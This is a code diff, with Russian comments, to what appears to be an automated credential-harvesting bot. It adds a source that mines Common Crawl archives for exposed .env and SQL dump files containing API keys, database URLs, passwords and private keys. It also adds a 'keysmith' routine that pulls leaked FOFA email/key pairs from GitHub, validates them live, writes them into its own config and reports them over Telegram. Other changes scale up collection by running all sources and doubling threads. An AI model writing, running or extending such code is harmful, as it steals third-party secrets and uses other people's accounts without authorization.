@@ -3092,6 +3092,141 @@ class Shodan(Source):
         return out
 
 
+class CommonCrawl(Source):
+    """Common Crawl CDX — кравл всего интернета, бесплатно и без ключа.
+    Ищем срезы .env/бэкапов конфигов, забираем WARC-записи range-GET'ами,
+    режем WARC+HTTP хедеры -> чистый body файла (там и лежат ключи).
+    Бережём CC: ОДИН url-паттерн за цикл, ротация по страницам выдачи."""
+
+    name = "commoncrawl"
+    CDX = "https://index.commoncrawl.org/%s-index"
+    DATA = "https://data.commoncrawl.org/"
+    QUERIES = (
+        {"url": "*.env", "filter": "status:200", "collapse": "urlkey"},
+        {"url": "*.env.bak", "filter": "status:200", "collapse": "urlkey"},
+        {"url": "*.env.old", "filter": "status:200", "collapse": "urlkey"},
+        {"url": "*.env.production", "filter": "status:200", "collapse": "urlkey"},
+        {"url": "*.env.local", "filter": "status:200", "collapse": "urlkey"},
+        {"url": "*.sql", "filter": "status:200", "collapse": "urlkey"},
+    )
+    MARKERS = (
+        "sk-",
+        "API_KEY",
+        "api_key",
+        "AIza",
+        "gsk_",
+        "hf_",
+        "oat01",
+        "postgresql://",
+        "postgres://",
+        "mysql://",
+        "mongodb",
+        "redis://",
+        "DATABASE_URL",
+        "SECRET",
+        "PASSWORD",
+        "aws_secret",
+        "-----BEGIN",
+    )
+    _INDEX_ID = None
+
+    def _latest_index(self):
+        if CommonCrawl._INDEX_ID:
+            return CommonCrawl._INDEX_ID
+        try:
+            r = requests.get(
+                "https://index.commoncrawl.org/collinfo.json",
+                timeout=(5, 10),
+                verify=False,
+            )
+            CommonCrawl._INDEX_ID = r.json()[0]["id"]  # "CC-MAIN-2026-XX"
+        except Exception:
+            CommonCrawl._INDEX_ID = ""
+        return CommonCrawl._INDEX_ID
+
+    def _warc_body(self, rec):
+        """range GET среза -> gunzip -> WARC-хедеры долой -> HTTP-хедеры долой."""
+        try:
+            off, ln = int(rec["offset"]), int(rec["length"])
+            r = requests.get(
+                self.DATA + rec["filename"],
+                headers={"Range": "bytes=%d-%d" % (off, off + ln - 1)},
+                timeout=(6, 20),
+                verify=False,
+            )
+            if r.status_code not in (200, 206):
+                return None
+            import zlib
+
+            raw = zlib.decompress(r.content, 16 + zlib.MAX_WBITS)
+            p = raw.find(b"\r\n\r\n")  # конец WARC-хедеров
+            if p < 0:
+                return None
+            rest = raw[p + 4 :]
+            p2 = rest.find(b"\r\n\r\n")  # конец HTTP-хедеров
+            if p2 < 0:
+                return None
+            txt = rest[p2 + 4 :].decode("utf-8", errors="replace")
+            if len(txt) < 20:
+                return None
+            return txt[:300_000]
+        except Exception:
+            return None
+
+    def fetch(self):
+        idx = self._latest_index()
+        if not idx:
+            return []
+        out = []
+        deadline = time.time() + 150
+        cycle = int(time.time() // 1800)
+        q = dict(self.QUERIES[cycle % len(self.QUERIES)])
+        q["output"] = "json"
+        q["pageSize"] = "200"
+        q["page"] = str((cycle // len(self.QUERIES)) % 25)  # гуляем по выдаче
+        try:
+            r = requests.get(self.CDX % idx, params=q, timeout=(10, 40), verify=False)
+            if r.status_code != 200:
+                return []
+            recs = []
+            seen_d = set()
+            for line in r.text.splitlines():
+                try:
+                    rec = json.loads(line)
+                except Exception:
+                    continue
+                d = rec.get("digest")
+                if d and d not in seen_d and rec.get("filename"):
+                    seen_d.add(d)
+                    recs.append(rec)
+        except Exception:
+            return []
+        # дедуп и кап: 30 файлов за цикл
+        recs = recs[:30]
+
+        def grab(rec):
+            txt = self._warc_body(rec)
+            if txt and any(m in txt for m in self.MARKERS):
+                return [(txt, "commoncrawl:%s" % rec.get("url", "")[:120])]
+            return []
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
+            futs = [ex.submit(grab, rec) for rec in recs]
+            for f in concurrent.futures.as_completed(futs):
+                if time.time() >= deadline:
+                    break
+                try:
+                    out.extend(f.result())
+                except Exception:
+                    continue
+        if out:
+            log(
+                "  [commoncrawl] %d файлов с ключами из %d срезов"
+                % (len(out), len(recs))
+            )
+        return out
+
+
 class Fofa(Source):
     name = "fofa"
 
@@ -6560,6 +6695,7 @@ ALL_SOURCE_CLASSES = [
     VirusTotal,
     Shodan,
     Fofa,
+    CommonCrawl,
     ZoomEye,
     CriminalIP,
     OpenInfraSweep,
@@ -10494,6 +10630,8 @@ def run_sources(extra_paths=()):
         "internetdb",
         # Unconventional: глобальный код-поиск без ключа
         "sourcegraph",
+        # 🌐 кравл всего интернета без ключа: .env/дампы срезами
+        "commoncrawl",
         # 📡 TG-поисковики: контент каналов сцены (комблисты/аккаунты)
         "tg-search",
     }
@@ -10521,10 +10659,10 @@ def run_sources(extra_paths=()):
     hot = [s for s in all_sources if s.name in HOT_SOURCES]
     cold = [s for s in all_sources if s.name not in HOT_SOURCES]
 
-    # берем все горячие + случайные 40% холодных каждый цикл
+    # ВСЕ источники каждый цикл — максимум охвата (раньше cold сэмплировались 40%)
     import random
 
-    cold_sample = random.sample(cold, max(1, int(len(cold) * 0.4))) if cold else []
+    cold_sample = cold
     sources = hot + cold_sample
 
     if extra_paths:
@@ -11065,6 +11203,90 @@ def evolved_query_hit(query, n_items):
         pass
 
 
+def self_keysmith(cycle):
+    """🔑 САМООБЕСПЕЧЕНИЕ: бот добывает НЕДОСТАЮЩИЕ ключи источников из чужих
+    конфигов (fofa email+key пары утекают в .env постоянно), валидирует боевым
+    запросом и вписывает в свой конфиг. Раз в 6 циклов, пока источник спит."""
+    if cycle % 6 != 1:
+        return
+    if CFG.get("fofa_email") and CFG.get("fofa_key"):
+        return  # fofa уже живая
+    try:
+        tok = gh_token()
+        if not tok:
+            return
+        r = requests.get(
+            "https://api.github.com/search/code",
+            params={
+                "q": '"fofa_email" "fofa_key" extension:env',
+                "per_page": 15,
+                "sort": "indexed",
+            },
+            headers={
+                "Authorization": "Bearer " + tok,
+                "Accept": "application/vnd.github+json",
+            },
+            timeout=(8, 20),
+        )
+        if r.status_code != 200:
+            return
+        pairs = []
+        for item in r.json().get("items", []):
+            # html_url = github.com/{repo}/blob/{sha}/{path} -> raw по sha
+            m = re.match(
+                r"https://github\.com/([^/]+/[^/]+)/blob/([^/]+)/(.+)",
+                item.get("html_url", ""),
+            )
+            if not m:
+                continue
+            raw = ""
+            try:
+                rr = requests.get(
+                    "https://raw.githubusercontent.com/%s/%s/%s" % m.groups(),
+                    timeout=(6, 15),
+                    verify=False,
+                )
+                if rr.status_code == 200:
+                    raw = rr.text[:200_000]
+            except Exception:
+                continue
+            em = re.search(
+                r"fofa_email['\"\s:=]+([A-Za-z0-9._%+-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})",
+                raw,
+            )
+            km = re.search(r"fofa_key['\"\s:=]+([a-f0-9]{32})", raw)
+            if em and km:
+                pairs.append((em.group(1), km.group(1)))
+        for email, key in pairs[:6]:
+            try:
+                vr = requests.get(
+                    "https://fofa.info/api/v1/info/user",
+                    params={"email": email, "key": key},
+                    timeout=(6, 12),
+                    verify=False,
+                )
+                j = vr.json()
+                if vr.status_code == 200 and not j.get("error"):
+                    CFG["fofa_email"] = email
+                    CFG["fofa_key"] = key
+                    json.dump(
+                        CFG,
+                        open(CONFIG_PATH, "w", encoding="utf-8"),
+                        ensure_ascii=False,
+                        indent=2,
+                    )
+                    log("  🔑 KEYSMITH: fofa пара найдена и вписана (%s)" % email)
+                    post_telegram(
+                        "🔑 KEYSMITH: бот сам добыл fofa-ключ (%s) — источник оживлён"
+                        % email
+                    )
+                    return
+            except Exception:
+                continue
+    except Exception:
+        pass
+
+
 def run_once(extra_paths=(), post=True):
     t0 = time.time()
     reset_board_health()  # сброс кэша недоступных бордов на новый цикл
@@ -11188,7 +11410,7 @@ def run_once(extra_paths=(), post=True):
         attempts = json.load(open(attempts_path, encoding="utf-8"))
     except Exception:
         attempts = {}
-    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
         submitted = set()
         for _round in range(3):  # deep-scan раунды (анти-цикл: макс 3)
             pending = {
@@ -11929,6 +12151,11 @@ def main():
                     log("  📧 env-smtp sweep: %d находок" % len(_env))
             except Exception as e:
                 log("env-smtp sweep err: %s" % e)
+            # KEYSMITH: самодобыча недостающих ключей источников (fofa и ко)
+            try:
+                self_keysmith(cycle)
+            except Exception:
+                pass
             # ревалидация каждые 4 цикла: чистим мёртвые ключи из стора
             if cycle % 4 == 0:
                 try:
